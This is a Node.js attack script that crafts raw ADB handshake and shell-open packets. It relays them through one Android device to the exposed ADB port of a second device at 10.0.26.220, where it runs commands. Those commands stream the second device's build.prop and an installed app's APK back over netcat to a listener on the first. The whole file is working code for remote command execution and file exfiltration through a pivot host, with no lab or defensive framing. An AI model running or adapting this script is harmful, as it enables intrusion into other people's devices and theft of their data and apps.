#!/usr/bin/env node
/**
 * Two-session nc relay: carefully debugged version
 * Session 1 (spawn): nc listener on D1 
 * Session 2 (exec): trigger .220 to push data to D1
 */
const { spawn, execSync } = require('child_process');
const fs = require('fs');

const D1 = 'localhost:8479';
const D1_IP = '10.0.96.174';
const SRC = '10.0.26.220';
const PORT = 34500;

function buildOpen(cmd) {
  const p = Buffer.from('shell:' + cmd + '\x00');
  const h = Buffer.alloc(24);
  h.writeUInt32LE(0x4e45504f, 0); h.writeUInt32LE(1, 4); h.writeUInt32LE(0, 8);
  h.writeUInt32LE(p.length, 12);
  let c = 0; for (const b of p) c += b;
  h.writeUInt32LE(c >>> 0, 16);
  h.writeUInt32LE((0x4e45504f ^ 0xFFFFFFFF) >>> 0, 20);
  return Buffer.concat([h, p]);
}

const sleep = ms => new Promise(r => setTimeout(r, ms));

async function main() {
  // Setup
  fs.writeFileSync('/tmp/adb_cnxn.bin',
    Buffer.from('434e584e00000001001000000700000032020000bcb1a7b1686f73743a3a00', 'hex'));
  execSync(`adb -s ${D1} push /tmp/adb_cnxn.bin /sdcard/cnxn.bin 2>/dev/null`);

  // Kill any old nc processes on D1
  try { execSync(`adb -s ${D1} shell "killall nc 2>/dev/null"`, { timeout: 5000 }); } catch(e) {}
  await sleep(1000);

  // ── Test with echo first ──
  console.log('=== Test A: echo relay ===');
  
  const echoCmd = `echo RELAY_TEST_${Date.now()} | nc -w 10 ${D1_IP} ${PORT}`;
  const echoOpen = buildOpen(echoCmd);
  fs.writeFileSync('/tmp/open_echo.bin', echoOpen);
  execSync(`adb -s ${D1} push /tmp/open_echo.bin /sdcard/open_echo.bin 2>/dev/null`);

  // Session 1: listener (spawn, stays alive)
  console.log('  Starting listener...');
  const listener1 = spawn('adb', ['-s', D1, 'shell',
    `nc -l -p ${PORT} -w 30 > /sdcard/echo_recv.bin; wc -c /sdcard/echo_recv.bin`
  ], { stdio: ['pipe', 'pipe', 'pipe'] });
  
  let l1out = '';
  listener1.stdout.on('data', d => l1out += d.toString());
  listener1.stderr.on('data', d => {});

  await sleep(2000);

  // Session 2: trigger (separate adb shell)
  console.log('  Triggering .220...');
  // Write trigger script to avoid quoting issues
  const trigScript = `#!/system/bin/sh
(cat /sdcard/cnxn.bin; sleep 0.5; cat /sdcard/open_echo.bin; sleep 5) | nc -w 8 ${SRC} 5555 > /dev/null 2>&1
echo TRIGGER_DONE
`;
  fs.writeFileSync('/tmp/trigger.sh', trigScript);
  execSync(`adb -s ${D1} push /tmp/trigger.sh /sdcard/trigger.sh 2>/dev/null`);
  
  try {
    const trigOut = execSync(`adb -s ${D1} shell sh /sdcard/trigger.sh`, {
      timeout: 20000, encoding: 'utf8'
    });
    console.log('  Trigger:', trigOut.trim());
  } catch(e) { console.log('  Trigger err:', e.message.slice(0, 80)); }

  // Wait for listener
  await new Promise(resolve => {
    const t = setTimeout(() => { listener1.kill(); resolve(); }, 15000);
    listener1.on('close', () => { clearTimeout(t); resolve(); });
  });
  console.log('  Listener result:', l1out.trim());

  // Check file
  try {
    const content = execSync(`adb -s ${D1} shell "cat /sdcard/echo_recv.bin 2>/dev/null"`, {
      timeout: 5000, encoding: 'utf8'
    });
    console.log('  Received:', content.trim());
  } catch(e) {}

  // ── Test B: small file ──
  console.log('\n=== Test B: /system/build.prop relay ===');
  
  // Kill leftover nc
  try { execSync(`adb -s ${D1} shell "killall nc 2>/dev/null"`, { timeout: 5000 }); } catch(e) {}
  await sleep(500);

  const PORT2 = PORT + 1;
  const fileCmd = `cat /system/build.prop 2>/dev/null | nc -w 30 ${D1_IP} ${PORT2}`;
  const fileOpen = buildOpen(fileCmd);
  fs.writeFileSync('/tmp/open_file.bin', fileOpen);
  execSync(`adb -s ${D1} push /tmp/open_file.bin /sdcard/open_file.bin 2>/dev/null`);

  // Listener
  console.log('  Starting listener...');
  const listener2 = spawn('adb', ['-s', D1, 'shell',
    `nc -l -p ${PORT2} -w 60 > /sdcard/file_recv.bin; wc -c /sdcard/file_recv.bin`
  ], { stdio: ['pipe', 'pipe', 'pipe'] });
  
  let l2out = '';
  listener2.stdout.on('data', d => l2out += d.toString());
  
  await sleep(2000);

  // Trigger
  console.log('  Triggering .220...');
  const trigScript2 = `#!/system/bin/sh
(cat /sdcard/cnxn.bin; sleep 0.5; cat /sdcard/open_file.bin; sleep 15) | nc -w 18 ${SRC} 5555 > /dev/null 2>&1
echo TRIGGER_DONE
`;
  fs.writeFileSync('/tmp/trigger2.sh', trigScript2);
  execSync(`adb -s ${D1} push /tmp/trigger2.sh /sdcard/trigger2.sh 2>/dev/null`);

  try {
    const trigOut = execSync(`adb -s ${D1} shell sh /sdcard/trigger2.sh`, {
      timeout: 30000, encoding: 'utf8'
    });
    console.log('  Trigger:', trigOut.trim());
  } catch(e) { console.log('  Trigger err:', e.message.slice(0, 80)); }

  // Wait for listener
  await new Promise(resolve => {
    const t = setTimeout(() => { listener2.kill(); resolve(); }, 30000);
    listener2.on('close', () => { clearTimeout(t); resolve(); });
  });
  console.log('  Listener result:', l2out.trim());

  // Check
  try {
    execSync(`adb -s ${D1} pull /sdcard/file_recv.bin /tmp/build_prop_test.txt 2>/dev/null`);
    const stat = fs.statSync('/tmp/build_prop_test.txt');
    console.log('  File size:', stat.size, 'bytes');
    if (stat.size > 0) {
      const content = fs.readFileSync('/tmp/build_prop_test.txt', 'utf8');
      console.log('  Preview:', content.slice(0, 200));
    }
  } catch(e) { console.log('  Pull err'); }

  // ── Test C: APK (only if B works) ──
  if (l2out.includes('/sdcard/file_recv.bin') && !l2out.includes('0 /sdcard')) {
    console.log('\n=== Test C: APK relay (8.3MB trademo) ===');
    
    try { execSync(`adb -s ${D1} shell "killall nc 2>/dev/null"`, { timeout: 5000 }); } catch(e) {}
    await sleep(500);

    const PORT3 = PORT + 2;
    const apkPath = '/data/app/~~Wxk7-55Bxuh7YZnn2ZFEiA==/com.app.trademo-5zyYOz2-ozsLRT0GbiAuSQ==/base.apk';
    const apkCmd = `cat "${apkPath}" | nc -w 60 ${D1_IP} ${PORT3}`;
    const apkOpen = buildOpen(apkCmd);
    fs.writeFileSync('/tmp/open_apk.bin', apkOpen);
    execSync(`adb -s ${D1} push /tmp/open_apk.bin /sdcard/open_apk.bin 2>/dev/null`);

    const listener3 = spawn('adb', ['-s', D1, 'shell',
      `nc -l -p ${PORT3} -w 120 > /sdcard/apk_recv.bin; wc -c /sdcard/apk_recv.bin`
    ], { stdio: ['pipe', 'pipe', 'pipe'] });
    let l3out = '';
    listener3.stdout.on('data', d => l3out += d.toString());
    
    await sleep(2000);

    const trigScript3 = `#!/system/bin/sh
(cat /sdcard/cnxn.bin; sleep 0.5; cat /sdcard/open_apk.bin; sleep 90) | nc -w 95 ${SRC} 5555 > /dev/null 2>&1
echo TRIGGER_DONE
`;
    fs.writeFileSync('/tmp/trigger3.sh', trigScript3);
    execSync(`adb -s ${D1} push /tmp/trigger3.sh /sdcard/trigger3.sh 2>/dev/null`);

    console.log('  Triggering APK transfer (may take ~90s)...');
    try {
      execSync(`adb -s ${D1} shell sh /sdcard/trigger3.sh`, {
        timeout: 120000, encoding: 'utf8'
      });
    } catch(e) {}

    await new Promise(resolve => {
      const t = setTimeout(() => { listener3.kill(); resolve(); }, 60000);
      listener3.on('close', () => { clearTimeout(t); resolve(); });
    });
    console.log('  Listener:', l3out.trim());
  }
}

main().catch(e => console.error(e));
